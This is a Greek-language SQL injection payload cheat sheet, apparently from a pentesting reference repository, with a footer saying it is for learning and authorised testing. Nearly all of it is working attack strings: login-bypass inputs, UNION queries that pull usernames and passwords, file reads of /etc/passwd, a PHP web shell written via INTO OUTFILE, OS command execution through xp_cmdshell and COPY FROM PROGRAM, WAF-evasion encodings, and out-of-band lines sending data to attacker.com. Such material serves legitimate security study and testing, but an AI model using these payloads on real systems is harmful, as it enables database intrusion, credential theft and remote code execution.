# 💉 Δοκιμαστικές είσοδοι SQL Injection

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../SQLi.md) • [🇹🇷 Türkçe Sürüm](SQLi.tr.md)

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## Πριν ξεκινήσετε

Το **SQL Injection** εμφανίζεται όταν μη έμπιστη είσοδος επηρεάζει τη δομή ενός ερωτήματος SQL. **DBMS** είναι το σύστημα βάσης δεδομένων, **UNION** η σύνδεση αποτελεσμάτων συμβατών ερωτημάτων και **blind** ο έλεγχος μέσω έμμεσων διαφορών, χωρίς άμεση εμφάνιση δεδομένων.

Αρχίστε με κατανόηση του πεδίου εισόδου και επαναλαμβανόμενες συγκρίσεις αποκρίσεων. Τα παραδείγματα διαφέρουν ανά DBMS, έκδοση, τύπο δεδομένων και δικαιώματα. Δεν αποτελούν μία ενιαία ακολουθία εντολών. Ορισμένα γράφουν αρχεία, αλλάζουν ρυθμίσεις ή καθυστερούν την υπηρεσία· επιλέξτε μόνο το ελάχιστο επιτρεπόμενο τεστ.

## 📋 Περιεχόμενα

- [Δοκιμαστικές είσοδοι ανίχνευσης](#section-01)
- [Παράκαμψη ταυτοποίησης](#section-02)
- [Εισαγωγή με UNION](#section-03)
- [Εισαγωγή με αξιοποίηση σφαλμάτων](#section-04)
- [Τυφλό SQL Injection](#section-05)
- [Εισαγωγή με χρονικές καθυστερήσεις](#section-06)
- [Παραδείγματα ανά σύστημα βάσης δεδομένων](#section-07)
- [Δοκιμές φίλτρων WAF](#section-08)
- [Εκτός άμεσου καναλιού απόκρισης — OOB](#section-09)
- [Γρήγορη αναφορά](#section-10)
- [Πηγές](#section-11)

---

<a id="section-01"></a>

## 🔍 Δοκιμαστικές είσοδοι ανίχνευσης

### Βασική ανίχνευση

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

### Ανίχνευση με λογικές συνθήκες

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

### Ανίχνευση με αριθμητικές συνθήκες

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

### Συνένωση συμβολοσειρών

```sql
' || 'test
' + 'test
' 'test
```

---

<a id="section-02"></a>

## 🔓 Παράκαμψη ταυτοποίησης

### Δοκιμές παράκαμψης σύνδεσης

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

### Πεδίο ονόματος χρήστη

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

### Πεδίο κωδικού πρόσβασης

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

### Συνήθεις συνδυασμοί δοκιμών

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

<a id="section-03"></a>

## 🔗 Εισαγωγή με UNION

> **Συμβατές στήλες:** Το UNION χρειάζεται κατάλληλο πλήθος και συμβατούς τύπους στηλών. Τα αποσπάσματα και οι δείκτες συνέχειας είναι παραδείγματα κατανόησης, όχι πλήρης έτοιμη σύνταξη για κάθε αρχικό ερώτημα.


### Προσδιορισμός πλήθους στηλών

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...συνέχεια της δοκιμής μέχρι να εμφανιστεί σφάλμα...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Βασικά παραδείγματα UNION

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

### Εξαγωγή δεδομένων

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

### UNION με σχόλια

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

<a id="section-04"></a>

## ⚠️ Εισαγωγή με αξιοποίηση σφαλμάτων

### Σφάλματα MySQL

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

### Σφάλματα MSSQL

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

### Σφάλματα PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

### Σφάλματα Oracle

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

<a id="section-05"></a>

## 🔮 Τυφλό SQL Injection

### Τυφλή ανίχνευση με λογικές συνθήκες

```sql
-- Αληθής συνθήκη
' AND 1=1--
' AND 'a'='a'--

-- Ψευδής συνθήκη
' AND 1=2--
' AND 'a'='b'--

-- Εξαγωγή χαρακτήρα
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

### Δυαδική αναζήτηση

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...περιορισμός της αναζήτησης μέχρι τον συγκεκριμένο χαρακτήρα...
```

### Προσδιορισμός μήκους

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

### Καταγραφή πινάκων και στηλών

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

<a id="section-06"></a>

## ⏱️ Εισαγωγή με χρονικές καθυστερήσεις

> **Διασταύρωση χρόνου:** Φόρτος και δικτυακή καθυστέρηση μπορούν να μιμηθούν αποτέλεσμα. Συγκρίνετε επαναλαμβανόμενα με κατάλληλη απόκριση αναφοράς και μικρά επιτρεπόμενα όρια. Οι συναρτήσεις και οι τύποι επιστροφής διαφέρουν ανά DBMS.


### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

<a id="section-07"></a>

## 🗄️ Παραδείγματα ανά σύστημα βάσης δεδομένων

> **Δικαιώματα και επιπτώσεις:** Ανάγνωση/εγγραφή αρχείων, επεκτάσεις και εντολές λειτουργικού δεν είναι διαθέσιμες σε κάθε λογαριασμό βάσης. Κάποια δείγματα δημιουργούν αντικείμενα ή μεταβάλλουν ρυθμίσεις· μην τα θεωρείτε απαραίτητα για μια ελάχιστη απόδειξη SQL Injection.


### Δοκιμαστικές είσοδοι MySQL

```sql
-- Έκδοση
' UNION SELECT @@version--
' UNION SELECT version()--

-- Τρέχων χρήστης
' UNION SELECT user()--
' UNION SELECT current_user()--

-- Βάση δεδομένων
' UNION SELECT database()--

-- Πίνακες
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Στήλες
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Ανάγνωση αρχείου
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Εγγραφή αρχείου
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### Δοκιμαστικές είσοδοι PostgreSQL

```sql
-- Έκδοση
' UNION SELECT version()--

-- Τρέχων χρήστης
' UNION SELECT current_user--

-- Βάση δεδομένων
' UNION SELECT current_database()--

-- Πίνακες
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Ανάγνωση αρχείου
' UNION SELECT pg_read_file('/etc/passwd')--

-- Εκτέλεση εντολής
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

### Δοκιμαστικές είσοδοι MSSQL

```sql
-- Έκδοση
' UNION SELECT @@version--

-- Τρέχων χρήστης
' UNION SELECT SYSTEM_USER--

-- Βάση δεδομένων
' UNION SELECT DB_NAME()--

-- Πίνακες
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Εκτέλεση εντολής
'; EXEC xp_cmdshell 'whoami';--

-- Ενεργοποίηση xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

### Δοκιμαστικές είσοδοι Oracle

```sql
-- Έκδοση
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- Τρέχων χρήστης
' UNION SELECT user FROM dual--

-- Βάση δεδομένων
' UNION SELECT ora_database_name FROM dual--

-- Πίνακες
' UNION SELECT table_name FROM all_tables--

-- Στήλες
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

<a id="section-08"></a>

## 🛡️ Δοκιμές φίλτρων WAF

> **Η κωδικοποίηση δεν εγγυάται παράκαμψη:** Η ερμηνεία αλλάζει ανά επίπεδο αποκωδικοποίησης και DBMS. Στο MySQL, το σχόλιο με δύο παύλες έχει προϋπόθεση λευκού/ελεγκτικού χαρακτήρα μετά τις παύλες. Διατηρούνται τα αρχικά αποσπάσματα και χρειάζονται προσαρμογή στο πραγματικό πλαίσιο.


### Παραλλαγές αντί κενού διαστήματος

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

### Παραλλαγές με σχόλια

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

### Παραλλαγές πεζών και κεφαλαίων

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

### Κωδικοποίηση

```sql
-- Κωδικοποίηση URL
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- Διπλή κωδικοποίηση URL
%2527%20OR%201=1--

-- Δεκαεξαδική κωδικοποίηση
' UNION SELECT 0x61646d696e--  (admin in hex)
```

### Παραλλαγές λέξεων-κλειδιών

```sql
-- Παραλλαγές UNION
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- Παραλλαγές SELECT
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- Παραλλαγές AND/OR
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

### HPP — επανάληψη παραμέτρων HTTP

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

<a id="section-09"></a>

## 📡 Εκτός άμεσου καναλιού απόκρισης — OOB

### Εξωτερικές αλληλεπιδράσεις MySQL

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

### Εξωτερικές αλληλεπιδράσεις MSSQL

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### Εξωτερικές αλληλεπιδράσεις PostgreSQL

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

### Εξωτερικές αλληλεπιδράσεις Oracle

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

<a id="section-10"></a>

## 📊 Γρήγορη αναφορά

### Σειρά δοκιμών ανίχνευσης

1. `'` — μονό εισαγωγικό
2. `"` — διπλό εισαγωγικό
3. `' OR '1'='1` — δοκιμή λογικής συνθήκης
4. `' AND SLEEP(5)--` — δοκιμή χρονικής καθυστέρησης
5. `' UNION SELECT NULL--` — δοκιμή UNION

### Συνήθη σημεία εφαρμογής

```
- Φόρμες σύνδεσης
- Πεδία αναζήτησης
- Αναγνωριστικά χρηστών σε URLs
- Τιμές cookies
- Κεφαλίδες HTTP (User-Agent, Referer)
- Παράμετροι API
```

### Σχόλια SQL ανά σύστημα βάσης δεδομένων

| DBMS | Σχόλια |
| ------ | ---------- |
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

<a id="section-11"></a>

## 📚 Πηγές

- [Υλικό PortSwigger για SQL Injection](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 Συλλογή δοκιμαστικών εισόδων SQL Injection</b><br>
  <i>Για μάθηση και εξουσιοδοτημένους ελέγχους.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
